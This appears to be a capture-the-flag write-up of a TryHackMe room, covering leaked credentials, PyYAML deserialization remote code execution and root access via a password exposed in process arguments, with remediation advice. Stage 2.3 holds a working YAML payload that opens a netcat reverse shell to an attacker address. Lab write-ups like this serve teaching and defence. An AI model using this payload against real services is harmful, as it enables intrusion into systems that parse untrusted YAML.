# Beach Bar — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Boot2Root-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg)
![OS](https://img.shields.io/badge/OS-Linux-success.svg)
![Event](https://img.shields.io/badge/Event-Hacker_Holidays_2026-yellow.svg)

A complete penetration testing writeup for the **Beach Bar** room (Hacker Holidays 2026 Day 5) on TryHackMe.

---

## 📋 Executive Summary
Beach Bar is a holiday-themed Linux Boot2Root challenge focusing on source code inspection, exploiting unsafe PyYAML deserialization (`yaml.load`) to obtain Remote Code Execution (RCE), and local privilege escalation via exposed process credentials.

* **Target OS:** Linux
* **Initial Access:** Leaked DJ credentials in HTML source comments -> Unsafe YAML Deserialization RCE.
* **Privilege Escalation:** Credential harvesting from active background processes -> Root access.

---

## 🔍 Stage 1: Reconnaissance & Enumeration

### 1.1 Port Scanning
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```
* **Port 22/tcp:** OpenSSH
* **Port 80/tcp:** HTTP (Beachside Jukebox Web Portal)

### 1.2 Web Source Code Inspection
Accessing `http://<TARGET_IP>/` displays a beach lounge jukebox interface. Inspecting the page source code reveals an HTML comment inadvertently left by developers:
```html
<!-- Demo login for staff testing: dj / dj -->
```

---

## 💥 Stage 2: Initial Foothold (PyYAML Deserialization RCE)

### 2.1 Authenticating to the Jukebox Portal
1. Navigate to the login portal and authenticate with `dj` : `dj`.
2. The user interface exposes a **Playlist Management** section allowing users to export and import `.yml` playlist files.

### 2.2 Vulnerability Analysis: Insecure PyYAML Deserialization
The backend processes imported playlist files using Python's `yaml.load()` without specifying `Loader=yaml.SafeLoader`. In PyYAML, unsafe deserialization allows arbitrary Python object instantiation and code execution using tags such as `!!python/object/apply`.

### 2.3 Crafting the Exploit Payload
We craft a malicious YAML playlist payload (`exploit.yml`) executing a reverse shell:
```yaml
title: "Summer Vibes"
author: "Attacker"
tracks:
  - !!python/object/apply:os.system
    args: ['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.xx.xx.xx 4444 >/tmp/f']
```

### 2.4 Exploitation
1. Start netcat listener:
   ```bash
   nc -lvnp 4444
   ```
2. Upload `exploit.yml` via the playlist import interface.
3. The server deserializes the payload, instantly executing `os.system` and connecting back to our netcat listener.
4. Caught shell as user `bartender`.

---

## 📈 Stage 3: Privilege Escalation to Root

### 3.1 Local Process Enumeration
Once on the machine, we enumerate running processes using `ps aux` or `pspy`:
```bash
ps aux | grep -v '^\['
```
A recurring administrative background script or service is executed with sensitive cleartext parameters:
```text
root 1421 0.0 0.1 24564 3456 ? S 02:15 /usr/bin/python3 /opt/admin/sync_service.py --key BeachBarMaster2026!
```

### 3.2 Elevating to Root
Using the recovered administrator key/password:
```bash
su - root
# Password: BeachBarMaster2026!
whoami
# root
cat /root/root.txt
```

---

## 🛡️ Remediation
1. **Remove Hardcoded Credentials:** Never leave credentials or developer testing comments in client-side HTML or templates.
2. **Safe Deserialization:** Always use `yaml.safe_load()` instead of `yaml.load()` when parsing untrusted user inputs.
3. **Hide Process Arguments:** Do not pass sensitive keys or passwords via command-line arguments visible in process tables (`/proc`). Use secure environment variables or restricted configuration files.
